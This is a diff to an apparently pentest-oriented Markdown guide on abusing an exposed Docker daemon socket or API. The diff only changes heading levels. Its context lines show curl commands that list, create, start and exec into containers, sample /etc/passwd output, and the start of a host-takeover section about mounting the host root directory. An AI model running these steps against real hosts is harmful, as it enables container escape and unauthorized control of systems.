@@ -11,7 +11,7 @@ On Systemd-based systems, communication with the Docker daemon can occur over th
 
 Sometimes the Docker daemon can be accessed inside the container or over the network. It is often leads to commands execution on the host system and escape from the container.
 
-## List of all containers
+# List of all containers
 
 `curl` command to list all containers on the host over `unix` socket.
 
@@ -25,7 +25,7 @@ $ curl -s --unix-socket /var/run/docker.sock http:/containers/json
 $ curl -s http://<host>:<port>/containers/json
 ```
 
-## Create a container
+# Create a container
 
 `curl` command to create container over `unix` socket.
 
@@ -52,7 +52,7 @@ $ curl \
     -d '{ "Image": "alpine:latest", "Cmd": [ "id" ] }'
 ```
 
-## Start the container
+# Start the container
 
 ```bash
 $ export CONTAINER_NAME=test-container
@@ -63,7 +63,7 @@ $ curl \
     -H "Content-Type: application/json" 
 ```
 
-## Code execution in a container
+# Code execution in a container
 
 First you need to create an instance of `exec` that will run in the container.
 
@@ -100,7 +100,7 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 ...
 ```
 
-## Host takeover
+# Host takeover
 
 To execute commands on the host system, start the Docker container and mount the host root directory on the container volume.
 
